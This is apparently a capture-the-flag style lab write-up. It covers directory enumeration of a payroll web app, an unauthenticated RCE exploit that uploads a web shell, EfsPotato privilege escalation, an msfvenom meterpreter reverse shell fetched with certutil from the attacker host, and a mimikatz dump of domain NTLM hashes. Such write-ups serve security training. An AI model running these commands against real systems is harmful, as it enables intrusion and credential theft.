200      GET       78l      313w     2728c http://192.168.208.141:81/bower_components/moment/locale/de.js
200      GET        9l       43w     2687c http://192.168.208.141:81/plugins/iCheck/flat/red.png]]
200      GET       56l      124w     1458c http://192.168.208.141:81/plugins/iCheck/flat/orange.css
200      GET       28l       93w     6156c http://192.168.208.141:81/plugins/iCheck/futurico/futurico@2x.png]]
200      GET      122l      492w     4097c http://192.168.208.141:81/bower_components/moment/locale/gom-latn.js
200      GET      104l      376w     3310c http://192.168.208.141:81/bower_components/moment/locale/zh-tw.js
200      GET       99l      313w     2483c http://192.168.208.141:81/bower_components/moment/locale/ur.js
200      GET      107l      422w     3645c http://192.168.208.141:81/bower_components/moment/locale/fi.js
200      GET       73l      297w     2454c http://192.168.208.141:81/bower_components/moment/locale/eo.js
200      GET       63l      253w     2025c http://192.168.208.141:81/bower_components/moment/locale/en-ca.js
200      GET      107l      432w     3784c http://192.168.208.141:81/bower_components/moment/locale/pl.js
200      GET      288l    13959w   108738c http://192.168.208.141:81/bower_components/bootstrap/fonts/glyphicons-halflings-regular.svg
200      GET       59l      226w     2192c http://192.168.208.141:81/bower_components/moment/locale/ar-kw.js
200      GET      126l      439w     4423c http://192.168.208.141:81/bower_components/moment/locale/kn.js
200      GET       69l      257w     2172c http://192.168.208.141:81/bower_components/moment/locale/ko.js
200      GET      107l      357w     3293c http://192.168.208.141:81/bower_components/moment/locale/fa.js
200      GET       70l      237w     2837c http://192.168.208.141:81/bower_components/moment/locale/lo.js
200      GET       75l      284w     2397c http://192.168.208.141:81/bower_components/moment/locale/ro.js
200      GET       58l      188w     2579c http://192.168.208.141:81/bower_components/moment/locale/km.js
200      GET      117l      440w     4120c http://192.168.208.141:81/bower_components/moment/locale/lt.js
200      GET       79l      321w     2805c http://192.168.208.141:81/bower_components/moment/locale/de-at.js
200      GET       78l      306w     2735c http://192.168.208.141:81/bower_components/moment/locale/de-ch.js
200      GET      119l      407w     4021c http://192.168.208.141:81/bower_components/moment/locale/bn.js
200      GET      105l      339w     3165c http://192.168.208.141:81/bower_components/moment/locale/ar-sa.js
200      GET       88l      417w     3089c http://192.168.208.141:81/bower_components/moment/locale/ca.js
200      GET       82l      326w     2574c http://192.168.208.141:81/bower_components/moment/locale/ms.js
200      GET       71l      262w     2924c http://192.168.208.141:81/bower_components/moment/locale/si.js
200      GET     1371l     7564w   637479c http://192.168.208.141:81/images/desktop.jpg
200      GET       91l      417w     3346c http://192.168.208.141:81/bower_components/moment/locale/tzl.js
200      GET      105l      383w     3363c http://192.168.208.141:81/bower_components/moment/locale/zh-hk.js
200      GET       79l      329w     2550c http://192.168.208.141:81/bower_components/moment/locale/vi.js
200      GET       90l      355w     3178c http://192.168.208.141:81/bower_components/moment/locale/bg.js
200      GET      124l      478w     4360c http://192.168.208.141:81/bower_components/moment/locale/pa-in.js
200      GET       83l      331w     2672c http://192.168.208.141:81/bower_components/moment/locale/id.js
200      GET      105l      381w     3099c http://192.168.208.141:81/bower_components/moment/locale/az.js
200      GET      100l      298w     2679c http://192.168.208.141:81/bower_components/moment/locale/dv.js
200      GET       73l      305w     2402c http://192.168.208.141:81/bower_components/moment/locale/af.js
200      GET       60l      234w     2251c http://192.168.208.141:81/bower_components/moment/locale/ar-ma.js
200      GET       70l      289w     2269c http://192.168.208.141:81/bower_components/moment/locale/sq.js
200      GET       83l      360w     2796c http://192.168.208.141:81/bower_components/moment/locale/es.js
200      GET      486l     3203w   220438c http://192.168.208.141:81/dist/img/boxed-bg.jpg
200      GET        5l       19w     2102c http://192.168.208.141:81/dist/img/icons.png]]
200      GET       59l      197w     2164c http://192.168.208.141:81/bower_components/moment/locale/ar-tn.js
200      GET      137l      515w     4478c http://192.168.208.141:81/bower_components/moment/locale/lb.js
200      GET       89l      344w     2839c http://192.168.208.141:81/bower_components/moment/locale/ss.js
200      GET       89l      359w     3622c http://192.168.208.141:81/bower_components/moment/locale/te.js
200      GET       90l      331w     2667c http://192.168.208.141:81/bower_components/moment/locale/tr.js
200      GET       58l      240w     1912c http://192.168.208.141:81/bower_components/moment/locale/uz-latn.js
200      GET       75l      290w     2500c http://192.168.208.141:81/bower_components/moment/locale/fy.js
200      GET      111l      401w     3600c http://192.168.208.141:81/bower_components/moment/locale/zh-cn.js
200      GET       67l      287w     2188c http://192.168.208.141:81/bower_components/moment/locale/en-nz.js
200      GET       58l      223w     1960c http://192.168.208.141:81/bower_components/moment/locale/tzm-latn.js
200      GET       77l      342w     2590c http://192.168.208.141:81/bower_components/moment/locale/gl.js
200      GET       74l      271w     2370c http://192.168.208.141:81/bower_components/moment/locale/fr-ca.js
200      GET      100l      215w     3042c http://192.168.208.141:81/dist/css/alt/AdminLTE-select2.css
200      GET      159l      593w     5870c http://192.168.208.141:81/bower_components/moment/locale/mr.js
200      GET       61l      237w     2098c http://192.168.208.141:81/bower_components/moment/locale/se.js
200      GET       78l      304w     2532c http://192.168.208.141:81/bower_components/moment/locale/fr-ch.js
200      GET       60l      232w     1927c http://192.168.208.141:81/bower_components/moment/locale/nn.js
200      GET       88l      328w     3266c http://192.168.208.141:81/bower_components/moment/locale/nl.js
200      GET      151l      536w     5717c http://192.168.208.141:81/bower_components/moment/locale/uk.js
200      GET       59l      236w     1915c http://192.168.208.141:81/bower_components/moment/locale/sw.js
200      GET       59l      227w     2219c http://192.168.208.141:81/bower_components/moment/locale/ar-dz.js
200      GET       76l      338w     2432c http://192.168.208.141:81/bower_components/moment/locale/gd.js
200      GET       80l      248w     2365c http://192.168.208.141:81/bower_components/moment/locale/ja.js
200      GET       88l      310w     2780c http://192.168.208.141:81/bower_components/moment/locale/ky.js
200      GET       69l      286w     2212c http://192.168.208.141:81/bower_components/moment/locale/sv.js
200      GET       87l      308w     2769c http://192.168.208.141:81/bower_components/moment/locale/kk.js
200      GET       64l      219w     2253c http://192.168.208.141:81/bower_components/moment/locale/mi.js
200      GET      162l      688w     5948c http://192.168.208.141:81/bower_components/moment/locale/sl.js
200      GET      145l      512w     4618c http://192.168.208.141:81/bower_components/moment/locale/hr.js
200      GET      120l      482w     3824c http://192.168.208.141:81/bower_components/moment/locale/tlh.js
200      GET     1433l     8653w   763662c http://192.168.208.141:81/dist/img/photo2.png]]
200      GET       20l      147w    11293c http://192.168.208.141:81/dist/img/user5-128x128.jpg
200      GET       20l       93w     8707c http://192.168.208.141:81/dist/img/user8-128x128.jpg
200      GET       22l      148w    14679c http://192.168.208.141:81/dist/img/avatar.png]]
200      GET        6l       82w     5933c http://192.168.208.141:81/dist/img/user3-128x128.jpg
200      GET       29l      164w    13759c http://192.168.208.141:81/dist/img/avatar5.png]]
200      GET     2547l    15691w  1213097c http://192.168.208.141:81/dist/img/photo1.png]]
200      GET       33l      159w    12210c http://192.168.208.141:81/dist/img/user2-160x160.jpg
200      GET    13700l    49597w   452020c http://192.168.208.141:81/bower_components/moment/min/moment-with-locales.js
200      GET     4023l    24508w  2157014c http://192.168.208.141:81/dist/img/photo4.jpg
200      GET     1203l     7516w   710884c http://192.168.208.141:81/dist/img/photo3.jpg
200      GET       89l      171w     2200c http://192.168.208.141:81/bower_components/bootstrap/package.json
301      GET        9l       29w      331c http://192.168.208.141:81/ADMIN => http://192.168.208.141:81/ADMIN/
302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/logout => index.php
302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/login => index.php
301      GET        9l       29w      340c http://192.168.208.141:81/ADMIN/includes => http://192.168.208.141:81/ADMIN/includes/
200      GET       36l      108w     1377c http://192.168.208.141:81/header
200      GET       99l      254w     4392c http://192.168.208.141:81/ADMIN/includes/position_modal.php
200      GET        6l       15w      230c http://192.168.208.141:81/ADMIN/includes/footer.php
200      GET       92l      241w     4154c http://192.168.208.141:81/ADMIN/includes/cashadvance_modal.php
200      GET       80l      306w     5520c http://192.168.208.141:81/ADMIN/includes/employee_modal.php
302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/Login => index.php
200      GET        8l       42w     1966c http://192.168.208.141:81/bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js
200      GET       16l       58w     4724c http://192.168.208.141:81/bower_components/jquery-slimscroll/jquery.slimscroll.min.js
302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/logout.php => index.php
200      GET        1l      112w     4188c http://192.168.208.141:81/bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css
200      GET        1l       72w    10804c http://192.168.208.141:81/bower_components/jquery-knob/dist/jquery.knob.min.js
200      GET      164l     1143w    81906c http://192.168.208.141:81/bower_components/datatables.net/js/jquery.dataTables.min.js
200      GET       14l      231w    14422c http://192.168.208.141:81/dist/js/adminlte.min.js
200      GET        6l      427w    62647c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/jquery.sparkline.min.js
200      GET        7l     1089w    51465c http://192.168.208.141:81/bower_components/moment/min/moment.min.js
302      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/login.php => index.php
302      GET      645l     2443w    40419c http://192.168.208.141:81/ADMIN/cashadvance.php => index.php
200      GET      208l      601w     8188c http://192.168.208.141:81/ADMIN/index
200      GET        7l      369w    35652c http://192.168.208.141:81/bower_components/morris.js/morris.min.js
200      GET      269l      778w     8163c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/daterangepicker.css
200      GET        5l      171w    15453c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.min.js
200      GET     3477l    11280w   109612c http://192.168.208.141:81/bower_components/chart.js/Chart.js
302      GET      561l     2192w    35874c http://192.168.208.141:81/ADMIN/payroll.php => index.php
200      GET        7l      757w    15731c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/css/bootstrap-datepicker.min.css
200      GET        3l     1189w    93251c http://192.168.208.141:81/bower_components/raphael/raphael.min.js
302      GET      642l     2436w    40043c http://192.168.208.141:81/ADMIN/position.php => index.php
200      GET     1626l     5242w    69588c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/daterangepicker.js
200      GET        8l      406w    33529c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/js/bootstrap-datepicker.min.js
200      GET       11l       46w    51284c http://192.168.208.141:81/bower_components/Ionicons/css/ionicons.min.css
302      GET      676l     2503w    41295c http://192.168.208.141:81/ADMIN/overtime.php => index.php
302      GET      840l     2902w    50562c http://192.168.208.141:81/ADMIN/employee.php => index.php
302      GET      584l     2281w    38236c http://192.168.208.141:81/ADMIN/schedule_employee.php => index.php
200      GET       46l       98w     1085c http://192.168.208.141:81/bower_components/jquery-slimscroll/bower.json
200      GET       32l      103w     1013c http://192.168.208.141:81/bower_components/jquery-slimscroll/package.json
200      GET      474l     1341w    13832c http://192.168.208.141:81/bower_components/jquery-slimscroll/jquery.slimscroll.js
302      GET      723l     2662w    43664c http://192.168.208.141:81/ADMIN/home.php => index.php
200      GET       20l      169w     1096c http://192.168.208.141:81/bower_components/datatables.net/License.txt
200      GET       36l       53w      692c http://192.168.208.141:81/bower_components/datatables.net/bower.json
200      GET      841l     3207w    25965c http://192.168.208.141:81/bower_components/fastclick/lib/fastclick.js
200      GET       12l       15w      174c http://192.168.208.141:81/bower_components/fastclick/bower.json
200      GET       22l      169w     1068c http://192.168.208.141:81/bower_components/fastclick/LICENSE
200      GET       64l      116w     1081c http://192.168.208.141:81/bower_components/raphael/webpack.config.js
200      GET       21l      170w     1083c http://192.168.208.141:81/bower_components/raphael/license.txt
200      GET       13l     1743w   240427c http://192.168.208.141:81/bower_components/jquery-ui/jquery-ui.min.js
302      GET      669l     2512w    41541c http://192.168.208.141:81/ADMIN/schedule.php => index.php
200      GET       32l       72w      894c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/package.json
200      GET      121l      293w     2780c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.css
200      GET       10l       90w     2410c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.min.css
200      GET      137l      364w     3650c http://192.168.208.141:81/bower_components/chart.js/gulpfile.js
200      GET       11l       24w      239c http://192.168.208.141:81/bower_components/chart.js/bower.json
200      GET     1480l     4487w    57193c http://192.168.208.141:81/bower_components/Ionicons/css/ionicons.css
302      GET      650l     2452w    40605c http://192.168.208.141:81/ADMIN/deduction.php => index.php
200      GET        7l      167w     1060c http://192.168.208.141:81/bower_components/chart.js/LICENSE.md
200      GET      903l     2094w    26014c http://192.168.208.141:81/plugins/timepicker/bootstrap-timepicker.js
200      GET       38l       59w      829c http://192.168.208.141:81/bower_components/datatables.net-bs/bower.json
200      GET       55l      387w     2991c http://192.168.208.141:81/bower_components/chart.js/CONTRIBUTING.md
200      GET       20l      169w     1096c http://192.168.208.141:81/bower_components/datatables.net-bs/License.txt
200      GET       28l       57w      664c http://192.168.208.141:81/bower_components/chart.js/package.json
200      GET       12l       20w      234c http://192.168.208.141:81/bower_components/bootstrap-datepicker/bower.json
200      GET       48l       88w     1246c http://192.168.208.141:81/bower_components/bootstrap-datepicker/package.json
200      GET      182l      598w     4559c http://192.168.208.141:81/bower_components/datatables.net-bs/js/dataTables.bootstrap.js
200      GET        6l       18w      269c http://192.168.208.141:81/Scripts
200      GET       11l      378w    52091c http://192.168.208.141:81/bower_components/chart.js/Chart.min.js
200      GET        3l     1127w    90152c http://192.168.208.141:81/bower_components/raphael/raphael.no-deps.min.js
200      GET        8l     2944w   210932c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.min.js
302      GET      885l     3124w    54235c http://192.168.208.141:81/ADMIN/attendance.php => index.php
200      GET     8353l    34429w   314913c http://192.168.208.141:81/bower_components/raphael/raphael.js
200      GET       40l       76w      826c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-1.2.2.css
200      GET       44l      271w     1827c http://192.168.208.141:81/bower_components/jquery-ui/LICENSE.txt
200      GET       69l      163w     2083c http://192.168.208.141:81/bower_components/jquery-ui/composer.json
200      GET       13l       21w      221c http://192.168.208.141:81/bower_components/jquery-ui/component.json
200      GET       12l       18w      151c http://192.168.208.141:81/bower_components/jquery-ui/bower.json
200      GET       71l      149w     1689c http://192.168.208.141:81/bower_components/jquery-ui/package.json
200      GET      284l      883w    10759c http://192.168.208.141:81/bower_components/jquery-ui/AUTHORS.txt
200      GET        8l      267w    33323c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-1.2.2.min.js
200      GET     7927l    32618w   299364c http://192.168.208.141:81/bower_components/raphael/raphael.no-deps.js
200      GET       31l       59w      691c http://192.168.208.141:81/bower_components/Ionicons/bower.json
200      GET       19l       35w      429c http://192.168.208.141:81/bower_components/Ionicons/component.json
200      GET       36l       66w      887c http://192.168.208.141:81/bower_components/Ionicons/composer.json
200      GET        5l        8w       94c http://192.168.208.141:81/bower_components/raphael/dev/raphael.amd.js
200      GET       21l      171w     1094c http://192.168.208.141:81/bower_components/Ionicons/LICENSE
200      GET     2012l     2913w    67903c http://192.168.208.141:81/bower_components/raphael/yarn.lock
301      GET        9l       29w      369c http://192.168.208.141:81/bower_components/jquery-slimscroll/examples => http://192.168.208.141:81/bower_components/jquery-slimscroll/examples/
200      GET      149l      731w     5039c http://192.168.208.141:81/bower_components/chart.js/docs/02-Bar-Chart.md
200      GET      166l      797w     5570c http://192.168.208.141:81/bower_components/chart.js/docs/01-Line-Chart.md
200      GET      158l      827w     5710c http://192.168.208.141:81/bower_components/chart.js/docs/05-Pie-Doughnut-Chart.md
200      GET        1l      961w   144313c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-world-mill-en.js
200      GET      343l      828w    10089c http://192.168.208.141:81/bower_components/chart.js/src/Chart.Radar.js
200      GET      303l      770w    13014c http://192.168.208.141:81/bower_components/jquery-knob/
200      GET        1l      330w    95062c http://192.168.208.141:81/plugins/jvectormap/jquery-jvectormap-usa-en.js
200      GET      755l     4545w   389831c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/drp.png]]
200      GET       15l      108w     7429c http://192.168.208.141:81/images/facebook-profile-image.jpeg
200      GET    16617l    60375w   470596c http://192.168.208.141:81/bower_components/jquery-ui/jquery-ui.js
200      GET       41l       73w     1084c http://192.168.208.141:81/bower_components/jquery-sparkline/Makefile
200      GET       20l       33w      390c http://192.168.208.141:81/bower_components/morris.js/bower.travis.json
200      GET       90l      182w     2274c http://192.168.208.141:81/bower_components/morris.js/Gruntfile.js
200      GET       20l       35w      391c http://192.168.208.141:81/bower_components/morris.js/bower.json
200      GET       36l       71w      871c http://192.168.208.141:81/bower_components/morris.js/package.json
200      GET        2l        8w      433c http://192.168.208.141:81/bower_components/morris.js/morris.css
301      GET        9l       29w      355c http://192.168.208.141:81/bower_components/Ionicons/png]] => http://192.168.208.141:81/bower_components/Ionicons/png]]/
200      GET     1892l     7068w    66047c http://192.168.208.141:81/bower_components/morris.js/morris.js
200      GET       22l      135w     1143c http://192.168.208.141:81/bower_components/bootstrap/ISSUE_TEMPLATE.md
200      GET        9l       26w      365c http://192.168.208.141:81/bower_components/jquery-slimscroll/examples/index
200      GET       12l       55w      982c http://192.168.208.141:81/bower_components/Ionicons/src/calendar
200      GET    15242l    64948w   445792c http://192.168.208.141:81/bower_components/datatables.net/js/jquery.dataTables.js
200      GET       27l       50w      484c http://192.168.208.141:81/bower_components/morris.js/less/morris.core.less
301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/examples/lib => http://192.168.208.141:81/bower_components/morris.js/examples/lib/
200      GET      117l      239w     2553c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.css
200      GET        4l     1058w    69597c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.min.js
200      GET        1l        7w   131666c http://192.168.208.141:81/bower_components/jquery/dist/jquery.min.map
200      GET        1l        2w   104583c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.min.map
200      GET    14975l    50670w   566620c http://192.168.208.141:81/plugins/bootstrap-wysihtml5/bootstrap3-wysihtml5.all.js
200      GET     8160l    32872w   215256c http://192.168.208.141:81/bower_components/jquery/dist/jquery.slim.js
200      GET      140l      145w   306319c http://192.168.208.141:81/dist/css/adminlte.min.css.map
200      GET    10253l    40950w   268039c http://192.168.208.141:81/bower_components/jquery/dist/jquery.js
200      GET      140l      145w   309656c http://192.168.208.141:81/dist/css/adminlte.css.map
302      GET        0l        0w        0c http://192.168.208.141:81/admin/login => index.php
200      GET       14l       55w     1196c http://192.168.208.141:81/bower_components/Ionicons/src/Help
200      GET       10l       61w      733c http://192.168.208.141:81/bower_components/Ionicons/src/information
200      GET        8l       48w      706c http://192.168.208.141:81/bower_components/Ionicons/src/play
200      GET       15l       29w      324c http://192.168.208.141:81/ADMIN/includes/datatable_initializer.php
200      GET       99l      248w     4433c http://192.168.208.141:81/ADMIN/includes/deduction_modal.php
200      GET      107l      268w     4813c http://192.168.208.141:81/ADMIN/includes/schedule_modal.php
302      GET       36l      340w     5366c http://192.168.208.141:81/ADMIN/includes/session.php => index.php
200      GET      104l      297w     4116c http://192.168.208.141:81/ADMIN/includes/scripts.php
200      GET      138l      342w     6212c http://192.168.208.141:81/ADMIN/includes/overtime_modal.php
302      GET        8l       72w     1363c http://192.168.208.141:81/ADMIN/profile_update.php => home.php
200      GET       18l       87w     1495c http://192.168.208.141:81/bower_components/bootstrap-datepicker/dist/
200      GET       72l      389w     6091c http://192.168.208.141:81/ADMIN/includes/menubar.php
200      GET      130l      891w    13938c http://192.168.208.141:81/ADMIN/includes/navbar.php
302      GET      723l     2662w    43664c http://192.168.208.141:81/ADMIN/home => index.php
200      GET      119l      660w    11189c http://192.168.208.141:81/ADMIN/includes/profile_modal.php
200      GET      132l      321w     5988c http://192.168.208.141:81/ADMIN/includes/attendance_modal.php
200      GET       33l      201w     3380c http://192.168.208.141:81/ADMIN/includes/employee_schedule_modal.php
200      GET        0l        0w        0c http://192.168.208.141:81/ADMIN/includes/conn.php
200      GET     3063l    11627w   123754c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/jquery.sparkline.js
200      GET       17l       73w     1309c http://192.168.208.141:81/bower_components/jquery-sparkline/dist/
301      GET        9l       29w      358c http://192.168.208.141:81/bower_components/bootstrap/grunt => http://192.168.208.141:81/bower_components/bootstrap/grunt/
200      GET       12l       54w      860c http://192.168.208.141:81/bower_components/Ionicons/src/monitor
200      GET       14l       54w     1389c http://192.168.208.141:81/bower_components/Ionicons/src/key
200      GET       12l       60w      892c http://192.168.208.141:81/bower_components/Ionicons/src/ARCHIVE
200      GET      127l      283w     2034c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/Website
200      GET       20l      171w     1082c http://192.168.208.141:81/bower_components/jquery-knob/LICENSE
200      GET       11l       52w      782c http://192.168.208.141:81/bower_components/Ionicons/src/Share
301      GET        9l       29w      340c http://192.168.208.141:81/ADMIN/INCLUDES => http://192.168.208.141:81/ADMIN/INCLUDES/
200      GET        7l       59w      604c http://192.168.208.141:81/bower_components/Ionicons/src/Plus
301      GET        9l       29w      340c http://192.168.208.141:81/Admin/INCLUDES => http://192.168.208.141:81/Admin/INCLUDES/
200      GET      208l      601w     8188c http://192.168.208.141:81/Admin/Index
200      GET      146l      366w     5026c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/website.js
200      GET      127l      283w     2034c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/website.css
200      GET      852l     2720w    44920c http://192.168.208.141:81/bower_components/bootstrap-daterangepicker/website/Index
200      GET      104l      297w     4116c http://192.168.208.141:81/Admin/INCLUDES/scripts
301      GET        9l       29w      349c http://192.168.208.141:81/bower_components/jQuery => http://192.168.208.141:81/bower_components/jQuery/
200      GET     2084l     9398w    77973c http://192.168.208.141:81/bower_components/jquery-ui/ui/datepicker
301      GET        9l       29w      358c http://192.168.208.141:81/bower_components/jQuery/external => http://192.168.208.141:81/bower_components/jQuery/external/
200      GET       22l       80w     1752c http://192.168.208.141:81/bower_components/Ionicons/src/clipboard
301      GET        9l       29w      354c http://192.168.208.141:81/bower_components/jQuery/dist => http://192.168.208.141:81/bower_components/jQuery/dist/
200      GET       13l       56w     1052c http://192.168.208.141:81/bower_components/Ionicons/src/ipod
200      GET       25l       65w     2391c http://192.168.208.141:81/bower_components/Ionicons/src/AT
200      GET     2084l     9398w    77973c http://192.168.208.141:81/bower_components/jquery-ui/ui/DatePicker
200      GET       15l       57w     1003c http://192.168.208.141:81/bower_components/Ionicons/src/eye
301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/spec/SUPPORT => http://192.168.208.141:81/bower_components/morris.js/spec/SUPPORT/
200      GET       21l       69w     1404c http://192.168.208.141:81/bower_components/Ionicons/src/xbox
200      GET       21l       63w     1911c http://192.168.208.141:81/bower_components/Ionicons/src/Clock
301      GET        9l       29w      349c http://192.168.208.141:81/bower_components/JQuery => http://192.168.208.141:81/bower_components/JQuery/
200      GET       36l      242w     1605c http://192.168.208.141:81/bower_components/JQuery/license
200      GET      476l     1907w    11197c http://192.168.208.141:81/bower_components/jQuery/dist/Core
301      GET        9l       29w      365c http://192.168.208.141:81/bower_components/morris.js/examples/LIB => http://192.168.208.141:81/bower_components/morris.js/examples/LIB/
200      GET        0l        0w        0c http://192.168.208.141:81/Admin/INCLUDES/Conn
200      GET        9l       49w      819c http://192.168.208.141:81/bower_components/Ionicons/src/UpLoad
200      GET        7l       30w     2816c http://192.168.208.141:81/dist/img/credit/cirrus

```

Found the http://192.168.208.141:81/db/ with the database hashes, but it is failed

![Pasted image 20251215150836.png](/ob/Pasted%20image%2020251215150836.png)

![Pasted image 20251215150859.png](/ob/Pasted%20image%2020251215150859.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "CVE-2021-44087" >}} The webapp reveals that the website is using the Attendance and Payroll System which is easy to be attack as the RCE

{{< /toggle >}}

The title shows that 50801 RCE in https://www.exploit-db.com/exploits/50801

![Pasted image 20251215151425.png](/ob/Pasted%20image%2020251215151425.png)

```shell
─# python3 50801.py  http://192.168.208.141:81                

    >> Attendance and Payroll System v1.0
    >> Unauthenticated Remote Code Execution
    >> By pr0z

[*] Uploading the web shell to http://192.168.208.141:81
[*] Validating the shell has been uploaded to http://192.168.208.141:81
[✓] Successfully connected to web shell

```

### mary.williams to admin(SeImpersonatePrivilege)

![Pasted image 20251215152042.png](/ob/Pasted%20image%2020251215152042.png)

After the admin , use the mimikatz to find more

```shell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe C:\ProgramData\EfsPotato.cs -nowarn:1691,618
dir  C:\ProgramData\
EfsPotato.exe whoami



 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.204 LPORT=80  -f exe -o reverse.exe
 sudo msfconsole
 use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.45.204
  set LPORT 80
  exploit
  
  
certutil -urlcache -split -f http://192.168.45.204:8081/reverse.exe C:\ProgramData\reverse.exe

EfsPotato.exe "C:\ProgramData\reverse.exe" netlogon
```

![Pasted image 20251215153115.png](/ob/Pasted%20image%2020251215153115.png)

{{< toggle "Tag 🏷️" >}}

{{< tag " Lateral-Movement-mimikatz" >}} mimikatz.exe use the command of sekurlsa::logonpasswords to found the new cred of user 's NTLM

{{< /toggle >}}

```shell
C:\mimikatz_trunk\x64>mimikatz.exe
mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

Authentication Id : 0 ; 399853 (00000000:000619ed)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 4:45:52 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	credman :	

Authentication Id : 0 ; 136564 (00000000:00021574)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 135819 (00000000:0002128b)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 134785 (00000000:00020e81)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	credman :	

Authentication Id : 0 ; 85333 (00000000:00014d55)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	credman :	

Authentication Id : 0 ; 85162 (00000000:00014caa)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-90-0-1
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-19
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-20
	credman :	

Authentication Id : 0 ; 48838 (00000000:0000bec6)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-1
	credman :	

Authentication Id : 0 ; 48788 (00000000:0000be94)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-96-0-0
	credman :	

Authentication Id : 0 ; 46923 (00000000:0000b74b)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : 
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : OSCP
Logon Server      : (null)
Logon Time        : 2/12/2025 4:45:37 PM
SID               : S-1-5-18
	credman :	

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 399853 (00000000:000619ed)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 2/12/2025 4:45:52 PM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
	msv :	
	 [00000003] Primary
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
	 * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
	 * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
	tspkg :	
	wdigest :	
	 * Username : celia.almeda
	 * Domain   : OSCP
	 * Password : (null)
	kerberos :	
	 * Username : celia.almeda
	 * Domain   : OSCP.EXAM
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 136564 (00000000:00021574)
Session           : Service from 0
User Name         : Mary.Williams
Domain            : MS01
Logon Server      : MS01
Logon Time        : 2/12/2025 4:45:38 PM
SID               : S-1-5-21-2114389728-3978811169-1968162427-1002
	msv :	
	 [00000003] Primary
